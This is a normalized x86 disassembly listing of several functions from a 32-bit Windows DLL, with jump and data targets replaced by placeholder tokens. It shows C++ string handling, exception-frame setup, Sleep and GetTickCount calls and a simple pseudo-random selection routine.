mov eax [ ecx ]
push 0x1
call [ eax ]
mov edx [ ebx + 0x38 ]
add esi 0xc
cmp esi edx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
add [ ebx + 0x38 ] 0xfffffff4
lea ecx [ esi - 0xc ]
lea esp [ esp ]
movq xmm0 [ esi ]
lea ecx [ ecx + 0xc ]
movq [ ecx - 0xc ] xmm0
mov eax [ esi + 0x8 ]
add esi 0xc
mov [ ecx - 0x4 ] eax
cmp esi edx
jne r-xdata
sub_10030970
push ebp
mov ebp esp
push 0xffffffff
push sub_10051e78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ebx [ esi + 0x14 ]
mov [ ebp - 0x14 ] ebx
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x38 ]
mov esi [ esi + 0x34 ]
cmp esi edi
je r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0x40 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
add esi 0xc
cmp esi edi
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10030a10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10051ec9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ esp + 0x14 ] edi
mov eax [ edi ]
call [ eax + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn
lea ebx [ edi + 0x14 ]
mov [ esp + 0x24 ] ebx
jmp r-xdata
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x70 ] 0x0
xor eax eax
mov [ esp + 0x20 ] ax
mov ecx ebx
mov [ esp + 0x28 ] ebx
mov eax [ ebx ]
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x0
call [ eax + 0x8 ]
mov [ esp + 0x70 ] 0x1
mov esi [ edi + 0x34 ]
mov edi [ edi + 0x38 ]
cmp esi edi
je r-xdata
mov [ esp + 0x70 ] 0x0
mov ecx ebx
mov eax [ ebx ]
call [ eax + 0xc ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov ebx [ esp + 0x14 ]
push 0x1
call [ Sleep@IAT ]
mov edi [ esp + 0x14 ]
movq xmm0 [ esp + 0x18 ]
sub esp 0xc
mov eax [ esp + 0x2c ]
mov ecx esp
mov edi [ esp + 0x20 ]
movq [ ecx ] xmm0
mov [ ecx + 0x8 ] eax
lea eax [ esp + 0x3c ]
push eax
mov ecx edi
call sub_10030c90
jmp r-xdata
add esi 0xc
cmp esi edi
jne r-xdata
mov eax [ esi + 0x8 ]
lea edx [ esp + 0x48 ]
push [ esi ]
movq xmm0 [ esi ]
mov [ esp + 0x24 ] eax
mov eax [ ebx + 0x40 ]
push edx
movq [ esp + 0x20 ] xmm0
mov ecx [ eax + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x70 ] 0x2
lea ecx [ esp + 0x30 ]
cmp ecx eax
je r-xdata
mov eax [ edi ]
mov ecx edi
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
call [ eax + 0x18 ]
test eax eax
je r-xdata
push [ esp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x70 ] 0xffffffff
cmp [ esp + 0x44 ] 0x10
jb r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ebx [ esp + 0x24 ]
mov [ esp + 0x70 ] 0x1
cmp [ esp + 0x5c ] 0x10
jb r-xdata
cmp [ esp + 0x44 ] 0x10
jb r-xdata
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
push [ esp + 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
cmp [ eax + 0x14 ] 0x10
jae r-xdata
push [ esp + 0x30 ]
call j_sub_1003f3e3#2
mov eax [ esp + 0x14 ]
add esp 0x4
lea ecx [ esp + 0x30 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x70 ] 0x3
mov ecx [ eax ]
mov [ esp + 0x30 ] ecx
mov [ esp + 0x70 ] 0x2
mov [ eax ] 0x0
mov ecx [ eax + 0x10 ]
inc ecx
je r-xdata
mov ecx [ eax + 0x10 ]
mov [ esp + 0x40 ] ecx
mov ecx [ eax + 0x14 ]
mov [ esp + 0x44 ] ecx
mov [ eax + 0x14 ] 0xf
mov [ eax + 0x10 ] 0x0
mov [ eax ] 0x0
push ecx
push eax
lea eax [ esp + 0x38 ]
push eax
call sub_1003c640
mov eax [ esp + 0x1c ]
add esp 0xc
jmp r-xdata
sub_10030c90
push ebp
mov ebp esp
push 0xffffffff
push sub_10051f10
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ edi + 0x40 ]
mov edx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
movq xmm0 [ ebp + 0xc ]
mov ecx [ eax + 0xc ]
push edx
mov [ ebp - 0x30 ] edx
lea edx [ ebp - 0x28 ]
push esi
mov eax [ ecx ]
push edx
movq [ ebp - 0x38 ] xmm0
call [ eax + 0xc ]
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x28 ]
mov eax [ edi + 0x40 ]
push edx
mov ecx [ eax + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
lea esi [ edi + 0x14 ]
mov ebx eax
mov [ ebp - 0x3c ] esi
mov ecx esi
mov edx [ esi ]
call [ edx + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x34 ]
mov ecx [ edi + 0x38 ]
cmp eax ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx esi
mov eax [ esi ]
call [ eax + 0xc ]
test ebx ebx
je r-xdata
mov dx [ ebp - 0x30 ]
mov edi [ ebp - 0x38 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov eax [ ebx ]
mov ecx ebx
push 0x1
call [ eax ]
cmp [ eax ] edi
jne r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x10
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
add eax 0xc
cmp eax ecx
jne r-xdata
cmp [ eax + 0x8 ] dx
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov [ eax + 0x4 ] ebx
mov [ ebp - 0x4 ] 0x0
mov ecx esi
mov eax [ esi ]
call [ eax + 0xc ]
jmp r-xdata
sub_10030db0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebp
retn
sub esi 0x4
jb r-xdata
cmp esi 0xfffffffc
je r-xdata
mov eax [ ecx ]
cmp eax [ edx ]
jne r-xdata
mov al [ ecx ]
cmp al [ edx ]
jne r-xdata
add ecx 0x4
add edx 0x4
sub esi 0x4
jae r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0xfffffffd
je r-xdata
mov al [ ecx + 0x1 ]
cmp al [ edx + 0x1 ]
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
mov al [ ecx + 0x2 ]
cmp al [ edx + 0x2 ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov al [ ecx + 0x3 ]
cmp al [ edx + 0x3 ]
je r-xdata
sub_10030e10
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100310d0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10030e40
push ebp
mov ebp esp
push 0xffffffff
push sub_10051f60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10032ca0
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10030eb0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052027
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x4 ] 0x0
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x4 ]
mov [ edi ] r--data
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x2
lea ebx [ edi + 0x1c ]
mov [ ebp - 0x10 ] ebx
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
call sub_100332e0
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x7
lea ebx [ edi + 0x24 ]
mov [ ebp - 0x18 ] ebx
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
call sub_100332e0
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0xc
lea ebx [ edi + 0x2c ]
mov [ ebp - 0x10 ] ebx
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
call sub_100332e0
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x11
mov [ edi + 0x34 ] r--data
call [ GetTickCount@IAT ]
mov [ edi + 0x38 ] eax
mov [ ebp - 0x4 ] 0x12
lea eax [ ebp + 0x8 ]
cmp esi eax
je r-xdata
mov ecx [ ebp + 0x24 ]
mov eax 0x2aaaaaab
mov edi [ ebp + 0x20 ]
xor ebx ebx
sub ecx edi
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_100018b0
mov ecx [ ebp + 0x30 ]
mov eax 0x2aaaaaab
mov edi [ ebp + 0x2c ]
xor ebx ebx
sub ecx edi
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
xor esi esi
nop
mov ecx [ ebp + 0x3c ]
mov eax 0x2aaaaaab
mov edi [ ebp + 0x38 ]
xor ebx ebx
sub ecx edi
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
xor esi esi
lea esp [ esp ]
movzx eax [ rw-data ]
lea ecx [ esi + edi ]
push eax
push ecx
push ecx
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ecx + 0x1c ]
call sub_10033440
mov ecx [ ebp + 0x24 ]
lea esi [ esi + 0x18 ]
mov edi [ ebp + 0x20 ]
mov eax 0x2aaaaaab
sub ecx edi
inc ebx
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_100047b0
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x3c
xor esi esi
lea esp [ esp ]
movzx eax [ rw-data ]
lea ecx [ esi + edi ]
push eax
push ecx
push ecx
mov ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10033440
mov ecx [ ebp + 0x30 ]
lea esi [ esi + 0x18 ]
mov edi [ ebp + 0x2c ]
mov eax 0x2aaaaaab
sub ecx edi
inc ebx
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
movzx eax [ rw-data ]
lea ecx [ esi + edi ]
push eax
push ecx
push ecx
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10033440
mov ecx [ ebp + 0x3c ]
lea esi [ esi + 0x18 ]
mov edi [ ebp + 0x38 ]
mov eax 0x2aaaaaab
sub ecx edi
inc ebx
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
sub_100310d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100520ef
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x4
mov [ edi + 0x34 ] r--data
mov [ ebp - 0x4 ] 0x3
lea esi [ edi + 0x2c ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x7
mov ecx esi
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10032ca0
mov [ ebp - 0x4 ] 0x3
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x2
lea esi [ edi + 0x24 ]
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0xb
mov ecx esi
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10032ca0
mov [ ebp - 0x4 ] 0x2
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x1c ]
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0xf
mov ecx esi
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10032ca0
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ edi + 0x18 ] 0x10
jb r-xdata
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push [ edi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100311f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052129
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0xf400
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp ecx 0x2
jae r-xdata
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x10 ]
cmp edx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ esi + 0x10 ]
mov ecx esi
push 0x2
call sub_10001c70
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
lea edx [ ebp - 0x10 ]
cmp eax edx
jbe r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ax [ ebp - 0x10 ]
mov [ ecx ] ax
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] 0x2
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov [ eax + 0x2 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0xc ]
push 0x4
push eax
mov ecx esi
mov [ ebp - 0x14 ] 0x1
call sub_10005470
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
push 0x2
lea eax [ ebp - 0x10 ]
sub eax ecx
mov ecx esi
push eax
push esi
call sub_100018b0
jmp r-xdata
sub_10031300
push ebp
mov ebp esp
push 0xffffffff
push sub_100521c9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4c ] esi
mov ebx [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x64 ] 0x0
call sub_1003b670
mov [ ebp - 0x4 ] 0x1
mov ecx esi
mov eax [ esi ]
call [ eax + 0x14 ]
mov ecx eax
mov eax [ ebp - 0x18 ]
cmp eax ecx
jb r-xdata
sub ecx eax
mov [ ebp - 0x58 ] 0x0
imul eax [ esi + 0x38 ] 0x343fd
xor edx edx
mov [ ebp - 0x50 ] ecx
mov ecx 0x3
mov [ ebp - 0x54 ] 0x0
add eax 0x269ec3
mov [ esi + 0x38 ] eax
shr eax 0x10
div ecx
mov ebx edx
call sub_10033390
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4 ] 0x6
xor edi edi
add ebx 0x2
je r-xdata
mov [ ebx + 0x14 ] 0xf
mov [ ebp - 0x44 ] 0xf100
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] 0x0
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x28 ]
mov ecx esi
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_10031ca0
cmp [ esi + 0x30 ] 0x0
jbe r-xdata
lea ecx [ ecx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
lea eax [ ebp - 0x58 ]
mov ecx esi
push eax
sub esp 0x18
mov eax esp
mov [ ebp - 0x70 ] esp
push eax
call sub_10031a10
mov [ ebp - 0x4 ] 0x8
mov eax [ esi ]
mov esi [ ebp - 0x6c ]
push esi
mov [ ebp - 0x4 ] 0x6
mov ecx [ ebp - 0x4c ]
call [ eax + 0x10 ]
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x4 ] 0xa
lea ecx [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
push eax
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
call sub_10032d60
mov [ ebp - 0x4 ] 0x1
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
imul eax [ esi + 0x38 ] 0x343fd
mov [ ebp - 0x68 ] 0x0
add eax 0x269ec3
mov [ esi + 0x38 ] eax
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
jbe r-xdata
cmp [ esi + 0xd ] 0x0
jne r-xdata
cmp ecx 0x2
jae r-xdata
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x44 ]
cmp edx eax
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov eax esi
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
imul eax [ esi + 0x38 ] 0x343fd
xor edx edx
add eax 0x269ec3
mov [ esi + 0x38 ] eax
shr eax 0x10
div [ esi + 0x30 ]
mov esi [ esi + 0x2c ]
mov esi [ esi ]
test edx edx
je r-xdata
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_10032520
push 0x0
push r--data
mov ecx eax
call sub_100019e0
mov ecx [ esi + 0x20 ]
mov edx [ ebp - 0x50 ]
lea eax [ ecx + 0x2 ]
cmp eax edx
jae r-xdata
mov eax [ esi + 0x20 ]
add eax 0x2
cmp eax [ ebp - 0x50 ]
ja r-xdata
dec edx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
push [ ebx + 0x10 ]
mov ecx ebx
push 0x2
call sub_10001c70
mov edx ebx
mov edx [ ebx ]
jmp r-xdata
mov edi [ ebp - 0x58 ]
lea ebx [ esi + 0x10 ]
push ebx
lea ecx [ ebp - 0x58 ]
call sub_10032e20
cmp eax [ ebp - 0x58 ]
je r-xdata
cmp [ esi + 0xd ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x0
mov eax 0xfffffffe
sub eax ecx
add edx eax
mov [ ebp - 0x50 ] edx
jmp r-xdata
mov esi [ ebp - 0x4c ]
xor ecx ecx
mov [ ebp - 0x50 ] ecx
mov eax [ esi + 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ ebx + 0x10 ]
add eax edx
lea edx [ ebp - 0x44 ]
cmp eax edx
jbe r-xdata
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0x70 ]
cmp [ eax + 0x24 ] 0x10
lea edx [ eax + 0x10 ]
mov ecx [ edx + 0x10 ]
mov [ ebp - 0x60 ] ecx
jb r-xdata
dec edx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
jmp r-xdata
mov esi [ ebp - 0x4c ]
inc edi
cmp edi ebx
jae r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
lea esp [ esp ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ax [ ebp - 0x44 ]
mov [ ecx ] ax
cmp [ ebx + 0x14 ] 0x10
mov [ ebx + 0x10 ] 0x2
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov esi [ ebp - 0x4c ]
mov ecx [ esi + 0x20 ]
mov ebx [ ebp - 0x50 ]
lea eax [ ecx + 0x2 ]
cmp eax ebx
jae r-xdata
cmp [ ebx + 0x14 ] 0x10
mov ecx [ ebx + 0x10 ]
mov [ ebp - 0x5c ] ecx
jb r-xdata
mov edx [ edx ]
mov eax [ esi + 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
imul eax [ esi + 0x38 ] 0x343fd
xor edx edx
add eax 0x269ec3
mov [ esi + 0x38 ] eax
shr eax 0x10
div [ esi + 0x28 ]
mov esi [ esi + 0x24 ]
mov esi [ esi ]
test edx edx
je r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov eax ebx
jmp r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ eax + 0x2 ] 0x0
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push 0x2
lea eax [ ebp - 0x44 ]
sub eax ecx
mov ecx ebx
push eax
push ebx
call sub_100018b0
jmp r-xdata
test ebx 0xfffffffe
je r-xdata
mov [ ebp - 0x48 ] ebx
mov ecx [ ebx ]
mov [ ebp - 0x48 ] ecx
jmp r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
lea esp [ esp ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
mov edi [ ebp - 0x4c ]
mov eax 0xfffffffe
sub eax ecx
xor edx edx
add ebx eax
mov ecx ebx
imul eax [ edi + 0x38 ] 0x343fd
shr ecx 0x1
add eax 0x269ec3
mov [ edi + 0x38 ] eax
shr eax 0x10
div ecx
lea eax [ ebp - 0x40 ]
mov ecx edi
push edx
push eax
call sub_10031e60
mov [ ebp - 0x4 ] 0x7
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_10032520
lea ecx [ ebp - 0x40 ]
cmp eax ecx
je r-xdata
mov edx [ ebp - 0x5c ]
mov ebx [ ebp - 0x60 ]
cmp edx ebx
jae r-xdata
sub ebx 0x4
jb r-xdata
mov ebx [ ebp - 0x60 ]
mov ecx ebx
cmp [ ebp - 0x5c ] ecx
mov ecx [ ebp - 0x48 ]
cmovb ebx [ ebp - 0x5c ]
test ebx ebx
je r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
sub ebx [ ebp - 0x30 ]
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_100018b0
xor ecx ecx
cmp edx ebx
setne cl
or ecx 0xffffffff
jmp r-xdata
cmp ebx 0xfffffffc
je r-xdata
mov ecx [ ecx ]
cmp ecx [ edx ]
jne r-xdata
mov ecx [ ebp - 0x68 ]
mov esi [ ebp - 0x4c ]
inc ecx
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x68 ] ecx
cmp ecx 0x1
jb r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x74 ] eax
lea eax [ ebp - 0x74 ]
jmp r-xdata
test ecx ecx
xor ecx ecx
mov ecx [ ebp - 0x48 ]
mov cl [ ecx ]
cmp cl [ edx ]
jne r-xdata
mov ecx [ ebp - 0x48 ]
add edx 0x4
add ecx 0x4
mov [ ebp - 0x48 ] ecx
sub ebx 0x4
jae r-xdata
cmp [ eax ] edi
jne r-xdata
sets cl
test cl cl
jne r-xdata
sbb ecx ecx
or ecx 0x1
jmp r-xdata
cmp ebx 0xfffffffd
je r-xdata
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x48 ]
mov cl [ ecx + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
cmp ebx 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x48 ]
mov cl [ ecx + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x48 ]
mov cl [ ecx + 0x3 ]
cmp cl [ edx + 0x3 ]
je r-xdata
sub_10031830
push ebp
mov ebp esp
push 0xffffffff
push sub_10052210
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10032d60
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_100318a0
push ebp
mov ebp esp
